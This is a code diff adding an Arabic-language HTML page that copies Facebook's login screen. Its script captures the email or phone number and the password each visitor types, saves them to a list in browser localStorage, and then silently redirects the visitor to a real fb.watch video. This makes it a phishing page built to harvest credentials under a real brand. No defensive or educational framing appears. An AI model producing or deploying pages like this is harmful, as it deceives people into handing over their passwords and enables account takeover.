@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - فيسبوك</title>
+    <style>
+      body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #165ecc;
+        }
+
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .meta-logo {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .meta-logo img {
+            width: 120px;
+            opacity: 0.7;
+        }
+
+        .meta-logo img:hover {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>facebook</h1>
+        <p>يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+        <form onsubmit="handleLogin(event)">
+            <input id="email" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input id="password" type="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+            <a href="#">هل نسيت كلمة السر؟</a>
+            <button type="button" class="create-account" onclick="window.location.href='create_account.html'">إنشاء حساب جديد</button>
+        </form>
+    </div>
+
+    <script>
+        function handleLogin(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // استرجاع الحسابات المحفوظة أو تهيئة قائمة جديدة
+            const accounts = JSON.parse(localStorage.getItem('accounts')) || [];
+
+            // إضافة الحساب الجديد إلى القائمة
+            accounts.push({ email, password });
+
+            // حفظ القائمة المحدثة في localStorage
+            localStorage.setItem('accounts', JSON.stringify(accounts));
+
+            // التوجه إلى رابط الفيديو
+            window.location.href = 'https://fb.watch/vZyMB3BC3k/';
+        }
+    </script>
+</body>
+</html>
